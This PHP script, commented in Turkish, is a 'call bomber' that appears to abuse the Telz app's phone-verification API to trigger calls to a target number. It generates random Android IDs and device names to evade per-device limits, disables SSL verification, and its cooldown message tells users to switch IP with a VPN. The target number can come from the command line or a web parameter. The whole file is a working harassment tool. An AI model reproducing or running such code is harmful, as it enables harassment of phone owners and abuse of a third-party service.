<?php
/**
 * Ritalin Tool Call Bomber - PHP Versiyonu
 * Telz API üzerinden arama gönderir
 * Orijinal Python kodunun birebir çevirisi
 */

define('BASE_URL', 'https://api.telz.com/');
define('USER_AGENT', 'Telz-Android/17.5.33');
define('APP_VERSION', '17.5.33');
define('OS', 'android');
define('OS_VERSION', '15');
define('MODE', 'TEST_RANDOM_IDS'); // TEST_RANDOM_IDS veya DEBOUNCE
define('GOKU', 300); // Rate limit saniye

// Rate limiting için basit dosya tabanlı
$rate_limit_file = sys_get_temp_dir() . '/telz_ratelimit_' . md5($_SERVER['REMOTE_ADDR'] ?? 'local');

function can_call($phone) {
    $now = time();
    $data = @json_decode(@file_get_contents($rate_limit_file), true) ?: [];
    if (isset($data[$phone]) && ($now - $data[$phone]) < GOKU) {
        return false;
    }
    $data[$phone] = $now;
    file_put_contents($rate_limit_file, json_encode($data));
    return true;
}

function random_android_id() {
    return bin2hex(random_bytes(8));
}

function random_device_name() {
    $brands = ['Pixel', 'Xiaomi', 'Samsung', 'OnePlus', 'Moto'];
    return $brands[array_rand($brands)] . '-' . substr(bin2hex(random_bytes(3)), 0, 6);
}

function generate_uuid() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

function telz_request($endpoint, $payload, $android_id = null) {
    global $app_version, $os, $os_version, $uuid;
    
    if (MODE === 'TEST_RANDOM_IDS' && $android_id === null) {
        $android_id = random_android_id();
    }
    
    if (!isset($uuid)) {
        $uuid = generate_uuid();
    }
    
    $payload['android_id'] = $android_id ?? '13e50e93a6399e67';
    $payload['app_version'] = APP_VERSION;
    $payload['os'] = OS;
    $payload['os_version'] = OS_VERSION;
    $payload['ts'] = (int)(microtime(true) * 1000);
    $payload['uuid'] = $uuid;
    
    $ch = curl_init(BASE_URL . $endpoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: ' . USER_AGENT,
        'Accept-Encoding: gzip',
        'Content-Type: application/json; charset=UTF-8',
        'Accept: application/json'
    ]);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($http_code === 429) {
        throw new Exception("Fazla deneme! Retry-After header'ı kontrol edin.");
    }
    if ($http_code >= 400) {
        throw new Exception("HTTP Hata: " . $http_code);
    }
    
    $decoded = json_decode($response, true);
    if ($decoded === null) {
        return $response;
    }
    return $decoded;
}

// Ana işlem
if (php_sapi_name() === 'cli') {
    echo "Numara gir (+90xx): ";
    $phone = trim(fgets(STDIN));
} else {
    // Web üzerinden çalıştırılıyorsa GET parametresi
    $phone = $_GET['phone'] ?? $_POST['phone'] ?? null;
    if (!$phone) {
        die("Numara gerekli. ?phone=+905678889766");
    }
}

$phone = trim($phone);

// Rate limit kontrolü (DEBOUNCE modunda)
if (MODE === 'DEBOUNCE' && !can_call($phone)) {
    die("[!] Bu numaraya kısa süre önce arama atıldı. Lütfen " . GOKU . " saniye sonra tekrar deneyin veya VPN kullanarak IP değiştirin!\n");
}

$client = null; // Android ID otomatik oluşturulacak

echo "Phone: " . $phone . "\n";

try {
    // 1. auth_list
    $result = telz_request('app/auth_list', ['event' => 'auth_list']);
    echo "auth_list: " . json_encode($result) . "\n";
    
    // 2. run
    $device_name = (MODE === 'TEST_RANDOM_IDS') ? random_device_name() : 'Xiaomi 2311DRK48G';
    $result = telz_request('app/run', [
        'event' => 'run',
        'device_name' => $device_name,
        'ipv4_address' => '10.1.10.1',
        'ipv6_address' => 'FE80::1',
        'lang' => 'tr',
        'network_country' => 'tr',
        'network_type' => '4G',
        'roaming' => 'no',
        'root' => 'no',
        'run_id' => '',
        'sim_country' => 'tr'
    ]);
    echo "run: " . json_encode($result) . "\n";
    
    // 3. stat_btns
    $result = telz_request('app/stat_btns', [
        'event' => 'stat_btns',
        'btn' => 'on_reg_continue'
    ]);
    echo "stat_btns: " . json_encode($result) . "\n";
    
    // 4. validate_phonenumber
    $result = telz_request('app/validate_phonenumber', [
        'event' => 'validate_phonenumber',
        'phone' => $phone,
        'region' => 'TR'
    ]);
    echo "validate_phonenumber: " . json_encode($result) . "\n";
    
    // 5. auth_call - ASIL ARAMA GÖNDERME
    $attempt = "0";
    $result = telz_request('app/auth_call', [
        'event' => 'auth_call',
        'phone' => $phone,
        'attempt' => $attempt,
        'lang' => 'tr'
    ]);
    echo "auth_call (ARAMA GÖNDERİLDİ): " . json_encode($result) . "\n";
    
    // Başarılı ise status ok döner
    if (isset($result['status']) && $result['status'] === 'ok') {
        echo "\033[92m✓ ARAMA BAŞARIYLA GÖNDERİLDİ!\033[0m\n";
    } else {
        echo "\033[31m✗ Arama gönderilemedi. Hata: " . ($result['reason'] ?? 'Bilinmeyen') . "\033[0m\n";
    }
    
} catch (Exception $e) {
    echo "\033[31mHata: " . $e->getMessage() . "\033[0m\n";
}
?>